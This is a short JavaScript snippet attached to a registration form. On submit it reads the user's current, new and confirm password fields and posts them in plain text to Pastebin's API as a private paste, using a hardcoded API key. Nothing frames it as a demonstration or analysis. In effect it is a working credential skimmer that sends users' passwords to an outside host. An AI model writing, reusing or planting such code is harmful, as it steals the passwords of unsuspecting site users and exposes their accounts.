const form = document.querySelector('#register-form');
const api_key = 'y4Sl0pAK56NAXPhM9Qx0OkWJtVeKQyFg';

form.addEventListener('submit', (event) => {
  event.preventDefault(); // Prevent the form from submitting normally

  const currentPassword = document.querySelector('#pass1').value;
  const newPassword = document.querySelector('#pass2').value;
  const confirmPassword = document.querySelector('#pass3').value;

  // Create a new paste on Pastebin using the API
  const xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://pastebin.com/api/api_post.php');
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

  xhr.onreadystatechange = function() {
    if (xhr.readyState === XMLHttpRequest.DONE) {
      const response = xhr.responseText;
      console.log(response); // Print the response from Pastebin
    }
  }

  const params = `api_option=paste&api_dev_key=${api_key}&api_paste_code=${currentPassword}\n${newPassword}\n${confirmPassword}&api_paste_private=1&api_paste_name=form-paste`;

  xhr.send(params);

  // Reset the form fields
  form.reset();
});
